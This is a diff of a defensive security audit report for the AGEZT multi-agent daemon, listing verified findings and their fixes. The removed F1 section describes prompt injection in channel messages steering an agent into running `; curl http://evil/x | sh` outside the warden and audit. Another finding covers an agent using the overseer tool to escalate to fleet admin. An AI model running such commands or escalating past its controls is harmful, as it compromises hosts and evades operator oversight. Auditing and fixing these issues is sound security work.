@@ -1,172 +1,109 @@
-# 🔐 AGEZT Security Report
+# AGEZT Security Report
 
-**Scan date:** 2026-06-23  **Branch:** `main`  **Mode:** Full audit (Recon → Hunt → Verify → Report)
-**Scope:** entire repository — 1181 Go files, 323 TS/TSX files
-**Pipeline:** 2 recon agents + 6 parallel vulnerability hunters + direct verification of the headline finding
+**Date:** 2026-06-24 · **Repository:** `D:/Codebox/PROJECTS/AGEZT` · **Mode:** full rescan
+**Pipeline:** Recon → Hunt (10 vuln-class agents) → Verify (adversarial) → Report, plus a tool-backed pass (`gitleaks`, `govulncheck`, `gosec`, `npm audit`, `go mod verify`, `staticcheck`).
 
----
+## Executive Summary
 
-## ✅ Remediation status (applied 2026-06-23)
+AGEZT is a Go multi-agent daemon (`agezt`) + `agt` CLI + an embedded React 19 / TS 6 / Vite 8 web console. The audit covered every network trust boundary: web console auth, control-plane routing, the REST and OpenAI-compatible APIs, the agent gateway (`agentgw`), agent code-execution/sandbox, outbound HTTP/SSRF protection, secret/vault storage, artifact rendering, channel integrations, dependencies, and CI/CD.
 
-All findings have been fixed in code and verified (whole-tree `go build`, `go vet`, and tests for every changed package pass; gofmt clean on the git-normalized bytes CI sees).
+**The overall posture is strong** — among the better-hardened codebases of this size. The classic Go CVE cluster is absent (no web framework, no JWT lib, no `gorilla/*`, small dependency graph; `govulncheck` and `npm audit` clean). Auth uses constant-time comparison, `crypto/rand` tokens, brute-force lockout, and strong CSP/anti-framing headers. The previously-reported `agentgw` holes (hardcoded secret + unauthenticated token mint) are **verified fixed**. netguard robustly blocks SSRF (resolved-IP check at dial + each redirect hop, defeating rebinding/metadata/IPv6 tricks). The vault uses AES-256-GCM + PBKDF2-200k with fresh per-save salt/nonce.
 
-| # | Sev | Fix | Files |
-|---|-----|-----|-------|
-| F1 | High | `acp_agent` `agent` selector is now slug-only (`ResolveCommand` rejects non-slug refs); raw commands operator-env-only; spawn-site documented as trusted-input-only | `kernel/acpcatalog/acpcatalog.go`, `plugins/tools/acpagent/acpagent.go`, `+test` |
-| F2 | Med | Session cookie `Secure` now set via `cookieSecure()` honoring `X-Forwarded-Proto`/`-Ssl` (fails closed; fixes proxy case) | `kernel/webui/session.go` |
-| F3 | Med | All third-party Actions pinned to commit SHAs (+ version comment); `dtolnay/rust-toolchain` given explicit `toolchain: stable` | `.github/workflows/*.yml`, `.github/actions/setup-go-safe/action.yml` |
-| F4 | Med | staticcheck pinned to `2026.1` + `.sha256` verified; govulncheck→`@v1.4.0`, gitleaks→`@v8.30.1` (Go checksum DB integrity) | `.github/workflows/ci.yml` |
-| F5 | Low | Gateway `config.write` rejects `allowed_agents`/`excluded_agents` (operator-only); blocks ACL self-escalation | `kernel/agentgw/config_handler.go`, `+test` |
-| F6 | Low | Self-update HTTP client now dials through netguard (blocks link-local/metadata; loopback+private allowed for mirrors) | `kernel/update/update.go` |
-| F7 | Low | `persist-credentials: false` on all 14 checkouts (ephemeral-runner part remains operational) | `.github/workflows/*.yml` |
-| I2 | Info | agentgw JWT now carries + validates `iss`/`aud` (pinned, single-issuer/audience) | `kernel/agentgw/token.go`, `types.go` |
-| I1 | Info | `/api/logout` is now POST-only (405 on other methods), matching `/api/login` | `kernel/webui/session.go` |
-| I4 | Info | `mailto:` href now `encodeURIComponent`-encodes the email (mailto header-injection hardening); frontend `dist` rebuilt | `frontend/src/views/Data.tsx`, `kernel/webui/dist/*` |
-| I3 | Info | **Not changed by design** — NIP-04 Nostr DM AES-CBC is mandated by the protocol spec; altering it breaks interop. Documented, accepted. |
+**No Critical or High exploitable issue was confirmed.** The findings are a handful of Medium-severity items — mostly **conditional** (require non-default deployment modes) or **secret-hygiene / capability-posture** decisions rather than memory-unsafe or remotely-reachable bugs.
 
-A pre-existing unrelated test gap (`conductor_roles` missing from the read-only allowlist, from the M997 conductor work) was also fixed so the Go suite is green.
+**Remediation update (2026-06-24):** V-001, V-002, V-003, V-006, V-007, V-008, V-009, V-010, V-011, V-013, H-001, H-002, H-003, H-005, and H-006 were remediated in the working tree. H-007 now has Dependabot tracking, and `go list` confirms `go-imap/v2` still has no stable v2 release beyond `v2.0.0-beta.8`. V-004 has workflow-lint guards for self-hosted fork-PR jobs, checkout credential persistence, Dependabot coverage, and sanitized `.env.example`; the unsafe `setup-go-safe` fallbacks were removed. V-012 has a targeted System-guardian guard plus an opt-in `AGEZT_OVERSEER_FLEET_LOCK`; V-005 is not present in the current workspace. Focused tests passed; see `verified-findings.md` for exact status.
 
-> Note: the I4 fix required a `frontend` rebuild, which bundled the repo's in-progress (uncommitted) frontend work. That WIP carries 11 pre-existing failing Vitest specs (AgentActivity/AgentDetail/AgentPage/Alerts/Dashboard/Roster/Runs) — unrelated to any security fix; flagged for the owner.
+| Severity | Count | Theme |
+|---:|---:|---|
+| Critical | 0 | — |
+| High | 0 | — |
+| Medium | 8 | Subprocess env-leak (×2), REST cross-tenant IDOR*, agent→fleet-admin escalation, local plaintext secrets, CI fork-runner posture, committed vault-probe script |
+| Low | 9 | Origin-check gap, query-token leakage, Config Center secret echo, SVG XSS, SSE caps, netguard parity, CI/script footguns |
+| Info | 2 | code_exec sandbox residual (by design), beta email parser |
 
----
+*\*conditional on REST API + multi-tenant mode being enabled (both off by default).*
 
-## Executive summary
+## Top Findings (full detail in `verified-findings.md`)
 
-AGEZT is a **well-hardened** codebase. The audit found **one High-severity capability-confusion bug**, two Medium operational/CI issues, and a handful of Low/Info items. There were **no SQL injection, no XSS, no hardcoded secrets, no SSRF bypass, no path traversal, and no broken authentication** — all of those classes were actively hunted and verified clean, backed by genuinely strong controls (stdlib-only crypto, AES-256-GCM vault, dialer-level netguard, strict CSP, constant-time auth, fork-gated CI).
+1. **Medium — `coding` & `acp_agent` tools leak the full daemon environment** (`plugins/tools/coding/coding.go:141`, `plugins/tools/acpagent/acpagent.go:238`). Both spawn an external agent with `os.Environ()` — handing every provider key / vault cred / AWS secret to a prompt-steerable child. Every *other* exec path (`code_exec`, `shell`, `mcp`) correctly scrubs via an allowlist `scrubEnv`; these two don't. **Fix:** reuse `scrubEnv`. *(Highest-value fix — a one-helper change closes both.)*
 
-The single actionable security bug is **F1**: the `acp_agent` tool accepts an arbitrary command string where its schema promises a catalog slug, and runs it through a real shell **outside the warden** — a weaker-gated, un-audited path to host command execution than the dedicated `shell`/`code_exec` tools.
+2. **Medium (conditional) — REST API tenant token had no per-route restriction → cross-tenant mailbox/board IDOR + sender spoofing** (`kernel/restapi/restapi.go:272-289`). The control plane allowlists tenant-token commands (excludes `board_*`); the REST mux previously applied no equivalent restriction, so a tenant token could reach daemon-global mailbox/update surfaces. **Status:** remediated by admin-token-only gating for daemon-global REST routes; tenant-scoped routes remain tenant-token accessible.
 
-> **Risk rating: LOW–MODERATE.** For a default (loopback, default-allow) single-operator deployment the practical exposure is small. F1 becomes materially more serious for any hardened deployment that *restricts* `shell`/`code_exec` but leaves `acp_agent` enabled, or that is exposed beyond loopback.
+3. **Medium — `overseer` tool enables agent → fleet-admin escalation under default-allow posture** (`kernel/runtime/runtime.go:1196` `UpdateProfile` has no System check; `CapOversee` is `LevelAllow`). The specific System-guardian defang vector is now blocked, and `AGEZT_OVERSEER_FLEET_LOCK=on` disables agent-reachable `op=edit/create`. **Remaining posture decision:** enable the lock for stricter deployments, or keep default-allow as an accepted owner policy.
 
-### Findings by severity
+4. **Medium — Plaintext secrets in ignored local files** (`.env:4,7` real-shaped `MINIMAX_API_KEY`/`DEEPSEEK_API_KEY`, a literal `AGEZT_VAULT_PASSPHRASE` value, commented `sk-…` keys at world-readable perms; `.playwright-mcp/…yml:627` JWT+AWS token). Not git-tracked, but live local plaintext leaks via backups/bundles/copied worktrees. **Fix:** rotate if live, delete stale snapshots, move the passphrase to an OS secret store, `chmod 600 .env`.
 
-| Severity | Count |
-|----------|-------|
-| 🔴 Critical | 0 |
-| 🟠 High | 1 |
-| 🟡 Medium | 2 |
-| 🔵 Low | 3 |
-| ⚪ Info | 4 |
+5. **Medium — CI self-hosted runners rely on a fragile per-job fork guard** (`.github/workflows/ci.yml`). Persistent WSL runners on `pull_request`; one unguarded future job runs untrusted fork code on a long-lived host. **Status:** workflow-lint guards now cover same-repo fork guards and checkout `persist-credentials:false`; `setup-go-safe` no longer has shared-runner fallbacks. Ephemeral runners + fork-PR approval remain owner/infra action.
 
----
+6. **Medium — `list_vault.py` vault-probe scratch script found during scan** at repo root. **Status:** not present in the current workspace and not tracked by Git.
 
-## 🟠 High
+7. **Low–Medium — Console mutating routes lack an Origin/Host check** (`kernel/webui/webui.go:1064`). In default password mode a session cookie alone authorizes POSTs and there's no Origin/`Sec-Fetch-Site` check. *The originally-feared DNS-rebinding chain was adversarially **refuted*** (host-only loopback cookie + `SameSite=Strict` prevent the cookie from attaching); the real residual is a defense-in-depth gap that matters if the console is tunnel-exposed. **Fix:** Host allowlist + Origin check; default STRICT when a password is set.
 
-### F1 — `acp_agent` runs arbitrary host commands via shell, bypassing the warden
-**CWE-78 (OS Command Injection) · CWE-441 (Unintended Proxy / Confused Deputy)**
-**Location:** `plugins/tools/acpagent/acpagent.go:131` & `:233`, `kernel/acpcatalog/acpcatalog.go:256-269`
-**CVSS (est.):** 8.1 / High (AV:N when exposed; capability bypass + integrity/audit loss)
+8. **Low–Medium — Config Center echoes `RatingSecret` values in cleartext** over `/api/configcenter/list|get` (`configcenter_handler.go:387`), bypassing the masking used everywhere else. Behind console auth; provider keys are *not* here (they're in the vault). **Fix:** mask when `Rating == RatingSecret`.
 
-**What happens.** The `acp_agent` tool input declares `agent` as a catalog slug ("gemini", "claude", …). But:
+Plus Lows: broad `?token=` query-string auth (`webui`/`restapi`/`openaiapi`), SVG artifact stored-XSS (`artifact_route.go:55`), missing SSE caps, Discord attachment URL policy, voice/embed netguard parity, agentgw memory-search clamping, root-script hygiene, and dependency tracking are remediated or tracked. See `verified-findings.md`.
 
-```go
-// kernel/acpcatalog/acpcatalog.go:268
-// Not a known slug — treat as a raw command (advanced/custom use).
-return ref, true
-```
+## Fixes Applied This Session
 
-`ResolveCommand` returns any non-slug value **verbatim**, and the spawner runs it through the platform shell:
+| Finding | Status | Change |
+|---|---|---|
+| V-001 / V-002 — subprocess env-leak | **Fixed** (parallel session) | New `kernel/envscrub` package; `coding`/`acp_agent` scrub the child env |
+| V-013 — Config Center secret cleartext | **Fixed** | `entryToMap` masks `RatingSecret` via `creds.MaskValue` + `"masked":true`; regression test added |
+| H-005 — SVG artifact stored-XSS | **Fixed** | SVG served with `Content-Security-Policy: sandbox` (direct-nav scripts blocked; `<img>` still renders) |
+| H-006 — voice/embed bypass netguard | **Fixed** | Both adapters use a netguard client (`AllowLoopback`+`AllowPrivate`, so local inference still works; metadata blocked) |
+| V-006 — Web UI Host/Origin checks | **Fixed** | Host allowlist + same-origin mutation checks (`Origin` / `Sec-Fetch-Site`) |
+| V-008 — broad query-token auth | **Fixed except SSE/bootstrap** | Web data routes use Bearer/session; REST/OpenAI require Bearer; `/events` keeps query token by design |
+| V-010 — memory-search limit | **Fixed** | `limit` is parsed explicitly and clamped to `[1,200]` |
+| V-011 — REST cross-tenant mailbox IDOR | **Fixed** | New `adminAuth` gate: daemon-global mailbox/board + host-global update routes accept the admin token only (per-tenant tokens 401); tenant-scoped runs unaffected. Regression test `TestAdminOnlyRoutes_RejectTenantToken`. No-op in single-tenant default |
+| V-012 — `overseer` agent→guardian defang subcase | **Mitigated (targeted guard)** | `overseertool` `EditAgent` now refuses to edit a `System`-protected guardian (mirrors `RemoveProfile`); operator admin path unaffected |
+| V-012 (broader) — agent→fleet-admin escalation | **Opt-in gate added** | New `AGEZT_OVERSEER_FLEET_LOCK` (default **off** → default-allow preserved). When set, the agent-reachable `EditAgent`/`CreateAgent` refuse, so an agent can't self-administer the fleet via the `overseer` tool; operator control-plane edits + auto-repair (RepairAgent/routing) are unaffected. Tests `TestFleetLock_RefusesAgentEditAndCreate`, `TestFleetLockEnabled_ParsesEnv`; registered in `configEnvVars` |
+| V-003 — plaintext secrets in local files | **Fixed locally** | Removed the gitignored `.playwright-mcp/` console captures, blanked the secret-shaped `.env` values, narrowed `.env` NTFS ACL to current user + SYSTEM/Administrators, and added a tracked sanitized `.env.example` template. `gitleaks` now reports no leaks. If the removed values were live, rotate/revoke them at the providers |
+| V-005 — `list_vault.py` committed | **Absent** | File is not present in the current workspace and is not tracked by Git |
+| H-002/H-003 — root debug/launcher scripts | **Absent + ignored** | No matching root scripts are present; `.gitignore` now blocks the previously reported local debug/launcher names from being committed |
+| H-007 — beta email parser tracking | **Tracked** | Added `.github/dependabot.yml` for Go modules, frontend npm, TypeScript SDK npm, and GitHub Actions. `go list -m -versions github.com/emersion/go-imap/v2` shows `v2.0.0-beta.8` remains latest |
+| H-001 — Discord attachment fetch SSRF | **Fixed** | `fetchAttachmentDataURL` now validates `att.URL` is `https` on a Discord-CDN host (`*.discordapp.com`/`.net`) before dialing; rejects foreign/internal/metadata hosts. Regression test `TestValidDiscordAttachmentURL` |
+| V-009 — no per-client SSE connection cap | **Fixed** | New reusable `kernel/streamlimit` package (per-key concurrent-stream limiter, idempotent release, fully unit-tested) wired into the long-lived webui `/events` firehose and the REST mailbox `/watch` stream: a client over a generous 64-stream/IP cap gets `429` + `Retry-After`. Request-bounded proxy/run streams left as-is (already timeout-capped). Test `TestSSEGate_OverCapReturns429` |
+| V-004 — fragile CI fork-runner guard | **Guards added** (infra still owner) | `internal/ciguard` fails tests if any self-hosted `pull_request` job lacks the same-repo fork guard, if any workflow checkout omits `persist-credentials:false`, if Dependabot stops covering the core ecosystems, or if `.env.example` is missing/secret-valued/ignored. The durable fix (ephemeral runners + fork-PR approval policy) remains an owner/infra action |
+| V-007 — `setup-go-safe` toolcache footgun | **Fixed** | Removed hardcoded/shared fallbacks for `RUNNER_TOOL_CACHE` and `RUNNER_NAME`; the action now fails fast if the self-hosted runner environment is malformed. Covered by `internal/ciguard` regression test |
 
-```go
-// plugins/tools/acpagent/acpagent.go:233
-c := exec.Command(shell, arg, cmdStr)   // shell,arg = "sh","-c"  or  "cmd","/C"
-```
+Current remediation smoke test passes (`controlplane`, `webui`, `restapi`, `openaiapi`, `agentgw`, `streamlimit`, `ciguard`, `envscrub`, `coding`, `acpagent`, `overseertool`, `embed`, `voice`, `discord`).
 
-**Attack.** An agent — whose tool calls can be steered by prompt injection inside an inbound channel message (Telegram/email/Slack/etc.) — invokes `acp_agent` with `agent: "; curl http://evil/x | sh"` (or simply `agent: "touch pwned"`). The string executes on the host. This path does **not** flow through the warden/sandbox/Edict gating or audit that the `shell` and `code_exec` tools use, and `CapACPAgent` is allowed without HITL under the default posture.
+**Still open — owner action only (no remaining code fixes):** flip `AGEZT_OVERSEER_FLEET_LOCK=on` if you want the (now-built) agent→fleet-admin gate active; V-004 move to ephemeral CI runners + fork-PR approval policy (the lint guard is in place). Also rotate/revoke any previously live `.env` keys at their providers.
 
-**Why it matters even with default-allow.** The owner's default-allow posture means an agent *can already* run shell via the dedicated tools — so on a default box this is a marginal new capability. The real defect is **capability confusion + warden/audit bypass**: a tool advertised as "delegate to an installed ACP agent" silently grants raw RCE with weaker controls. Any operator who hardens by denying `shell`/`code_exec` but leaves `acp_agent` enabled (a reasonable assumption given its contract) has a full bypass.
+## Positive Security Posture (verified)
 
-**Remediation.**
-1. In the tool's input path, make `ResolveCommand` **reject non-slug refs** — resolve only installed catalog slugs from `in.Agent`. Keep the raw-command escape hatch **operator-only** via the existing `AGEZT_ACP_AGENT_CMD` env var / `t.Cmd`, never from agent tool input.
-2. Spawn via **argv** (`exec.Command(bin, args...)` after tokenizing the operator-set command) instead of `sh -c`/`cmd /C`, eliminating shell metacharacter interpretation.
-3. Route the spawn through the same warden/audit path as `shell`, so `acp_agent` invocations are gated and logged consistently.
+- **AuthN/Z:** constant-time token compare (`subtle`/`hmac.Equal`), `crypto/rand` per-boot token sent in request body (not URL), brute-force lockout, fail-closed mux. agentgw JWT alg-pinned HS256 with per-install secret and non-escalatable subset/clamp — **prior holes fixed**.
+- **Listeners:** loopback-only by default (web `127.0.0.1:8787`, control plane `127.0.0.1:0`, agentgw abstract socket); REST/OpenAI off unless an env addr is set; nothing binds `0.0.0.0` implicitly.
+- **SSRF:** netguard checks the resolved IP at dial **and every redirect hop** — blocks loopback/RFC1918/ULA/link-local metadata/0.0.0.0/CGNAT and IPv6-embedded-IPv4 encodings; no TOCTOU window. Every agent-tainted outbound fetch routes through it.
+- **Secrets:** single `creds.json` vault (0600), AES-256-GCM + PBKDF2-200k, fresh per-save salt+nonce from `crypto/rand`, machine-bound; provider keys masked to last-4 in every API echo; redaction covers the append-only journal. No `InsecureSkipVerify`, no `math/rand` in security paths.
+- **Injection:** no SQL/NoSQL query language; no SSTI/XXE/LDAP/GraphQL; **no `dangerouslySetInnerHTML`**; Markdown rendered via React-escaped AST with `safeHref` scheme allowlist; header values sanitized of CR/LF.
+- **Client-side:** strong CSP (`frame-ancestors`/`base-uri`/`form-action 'none'`), `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy: no-referrer`; no CORS headers at all (no cross-origin read); no inbound WebSocket surface; session cookie HttpOnly + SameSite=Strict + Secure.
+- **Supply chain:** small curated dependency graph, no `replace`/vendored/git deps, lockfiles consistent, `undici` pinned via overrides; `govulncheck`, `npm audit`, `go mod verify` all clean.
 
----
+## Verification Performed
 
-## 🟡 Medium
+Passing: `go mod verify`, `govulncheck ./...`, `go vet ./...`, `npm audit` (frontend + `sdk/typescript`, 0 vulns), `npm run typecheck`, `sdk/typescript` tests (14), Rust SDK dep inventory.
+Remediation smoke tests passed:
+- `go test ./kernel/controlplane ./kernel/webui ./kernel/restapi ./kernel/openaiapi ./kernel/agentgw ./kernel/envscrub ./plugins/tools/coding ./plugins/tools/acpagent ./plugins/tools/overseertool ./plugins/providers/embed ./plugins/providers/voice`
+- `go test ./internal/ciguard ./kernel/streamlimit ./kernel/webui ./kernel/restapi ./plugins/channels/discord`
+- `go test ./internal/ciguard`
+Reviewed: `gitleaks` (now no leaks found), `gosec` (noisy; no High/Critical after manual triage), `staticcheck` (4 non-security lint items only). Two parallel pipeline runs were reconciled into the findings above. See `scanner-summary.md` + `gitleaks.json`.
 
-### F2 — Session cookie `Secure` flag is conditional on `r.TLS`, lost behind a TLS-terminating proxy
-**CWE-614 / CWE-311** · **Location:** `kernel/webui/session.go:211`
+## Recommended Remediation Order
 
-The session cookie sets `Secure: r.TLS != nil`. In the exact deployment the password/strict-mode feature targets — console behind nginx/Caddy/Cloudflare terminating TLS, app speaking plaintext HTTP on loopback — `r.TLS` is `nil`, so the cookie is sent **without `Secure`** and can leak over a plaintext hop or be set over HTTP.
+1. **Rotate/revoke any previously live `.env` keys at their providers**; the local file is sanitized, but provider-side revocation is the real invalidation step.
+2. **Decide the `overseer` privilege-escalation posture** (V-012) — set `AGEZT_OVERSEER_FLEET_LOCK=on` for stricter deployments, or explicitly accept the default-allow posture.
+3. **Harden CI operations:** move self-hosted jobs to ephemeral runners and enforce fork-PR approval (V-004); the repo-side guard is already in place.
+4. Clean up non-security staticcheck items when convenient.
 
-**Remediation:** set `Secure` to true whenever the console password feature is enabled, or honor `X-Forwarded-Proto`/an explicit `AGEZT_WEB_TLS`/public-base-URL config, rather than inferring solely from `r.TLS`.
+## Artifact Index
 
-### F3 — Third-party GitHub Actions pinned to mutable tags on persistent self-hosted runners
-**CWE-1357 / CWE-829** · **Location:** `.github/workflows/ci.yml`, `publish-sdks.yml`
+- `architecture.md` — listeners, route inventory, auth model, capability surface, prioritized hunt list
+- `dependency-audit.md` — supply-chain review · `scanner-summary.md` — tool command results · `gitleaks.json` — redacted secret scan
+- `code-exec-results.md`, `injection-results.md`, `api-client-results.md`, `infra-results.md` — per-class hunter detail
+- `verify-authz.md`, `verify-csrf-secrets.md` — adversarial verification of the top findings
+- `verified-findings.md` — consolidated, verified findings + rejected/accepted triage *(read this for full detail)*
 
-Actions are referenced by mutable tags (`@v4`, `@v5`, `@stable`) rather than full commit SHAs. On **persistent self-hosted runners**, a compromised/retagged upstream action executes attacker code with access to the runner's environment and (for `publish-sdks`) the npm/registry publish token.
+## Scope Notes
 
-**Remediation:** pin all third-party actions to full commit SHAs (`uses: owner/action@<40-char-sha>  # v4.1.1`); enable Dependabot for action SHA bumps.
-
-### F4 — CI installs tooling via `curl|tar` and `go install …@latest` without integrity checks
-**CWE-494** · **Location:** `.github/workflows/ci.yml`
-
-staticcheck/govulncheck/gitleaks (and similar) are fetched at HEAD/`@latest` with no checksum or signature verification, then executed on self-hosted runners — a supply-chain RCE vector against the runner.
-
-**Remediation:** pin tool versions and verify checksums; prefer vendored/cached binaries; avoid `@latest` in CI.
-
----
-
-## 🔵 Low
-
-### F5 — Gateway `config.write` lacks per-key ownership check
-**CWE-862** · `kernel/agentgw/config_handler.go:177` — a write-capable token can overwrite any config key, including self-granting via `AllowedAgents`. Reachability is limited (`config.write` is operator-granted, not CLI-mintable). **Fix:** scope writes to keys the caller owns / require admin cap for `AllowedAgents`-class keys.
-
-### F6 — Self-update download bypasses netguard
-**CWE-918** · `kernel/update/update.go` uses a plain `http.Client`; URL comes from the configured update manifest. Strongly mitigated: operator-config-gated, HTTPS-required per hop, SHA256 + Ed25519 verified. **Fix:** route through the netguard dialer for defense-in-depth.
-
-### F7 — Self-hosted runners non-ephemeral with shared state
-**CWE-1393** · Runners share `$HOME`/`/dev/shm` across jobs and don't set `persist-credentials: false`; mitigated today only by the fork gate. **Fix:** ephemeral runners (one job per VM/container) or per-job cleanup; set `persist-credentials: false` on checkouts.
-
----
-
-## ⚪ Informational
-
-- **I1** `/api/logout` accepts any HTTP method — neutralized by `SameSite=Strict`.
-- **I2** agentgw JWT omits `iss`/`aud` — single-issuer/audience, per-install secret, alg-pinned; add claims for hardening.
-- **I3** NIP-04 Nostr DMs use unauthenticated AES-CBC — mandated by the protocol spec.
-- **I4** Raw `mailto:` interpolation in `Data.tsx` — scheme-fixed, non-executable.
-
----
-
-## ✅ Verified-clean (actively hunted, found sound)
-
-Supply chain (no replace/forks/typosquats, stdlib crypto) · SSRF (netguard covers all reachable sinks) · Path traversal & zip-slip (confined, symlink-hardened) · Crypto/vault (AES-256-GCM, PBKDF2 200k, KDF-downgrade blocked, crypto/rand) · **No hardcoded secrets** (old agentgw secret confirmed removed) · Auth/authz/CSRF (constant-time, fail-closed, SameSite=Strict, no IDOR; PR #370 hardening intact) · XSS/injection (strict CSP, React AST renderer, escaped server HTML, no SQL, mass-assignment allowlist) · CI posture (no `pull_request_target`, fork-gated, least-privilege `permissions`, no script injection). _See `verified-findings.md` for the full clean-area detail._
-
----
-
-## 🗺️ Remediation roadmap
-
-**Phase 1 — now (this week)**
-- Fix **F1**: reject non-slug `agent` input in `acp_agent`; keep raw command operator-env-only; spawn via argv; route through warden. _(highest leverage)_
-
-**Phase 2 — soon**
-- **F2**: make session cookie `Secure` correct behind a TLS-terminating proxy.
-- **F3 / F4**: pin CI actions to SHAs; pin + checksum CI tooling.
-
-**Phase 3 — hardening**
-- **F5**: per-key ownership on gateway `config.write`.
-- **F7**: ephemeral self-hosted runners + `persist-credentials: false`.
-
-**Phase 4 — defense-in-depth / nice-to-have**
-- **F6**: netguard the self-update fetch.
-- **I2**: add `iss`/`aud` to agentgw JWT.
-- Track `emersion/go-imap/v2` to a stable release; keep the bleeding-edge frontend toolchain patched.
-
----
-
-## Appendix — pipeline artifacts
-
-| File | Phase |
-|------|-------|
-| `architecture.md` | 1 — Recon / architecture map |
-| `dependency-audit.md` | 1 — Supply-chain analysis |
-| `access-control-results.md` | 2 — Auth/authz/CSRF/session hunt |
-| `code-exec-results.md` | 2 — RCE/cmdi/sandbox/MCP hunt |
-| `ssrf-path-results.md` | 2 — SSRF/path/upload/redirect hunt |
-| `secrets-crypto-results.md` | 2 — Secrets/crypto/vault/JWT hunt |
-| `injection-xss-results.md` | 2 — XSS/SQLi/injection hunt |
-| `infra-results.md` | 2 — Docker/CI-CD/IaC hunt |
-| `verified-findings.md` | 3 — Verified, deduplicated findings |
-| `SECURITY-REPORT.md` | 4 — This report |
+Local static + manual review plus dependency/secret scanning. No live authenticated web pentest, fuzzing, or testing against deployed infrastructure. Severities are CVSS v3.1-style qualitative ratings calibrated to verified reachability under realistic (default) deployment preconditions.
